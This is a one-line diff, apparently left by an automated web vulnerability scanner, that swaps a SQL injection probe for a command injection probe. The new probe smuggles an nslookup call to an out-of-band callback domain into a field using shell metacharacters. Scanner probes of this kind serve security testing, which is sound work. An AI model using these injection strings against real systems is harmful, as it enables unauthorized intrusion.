@@ -1,1 +1,1 @@
--1' OR 2+541-541-1=0+0+0+1 or 'CtLDSLU6'='
+&nslookup -q=cname hitmuqjmtmcdyc0a12.bxss.me&'\"`0&nslookup -q=cname hitmuqjmtmcdyc0a12.bxss.me&`'
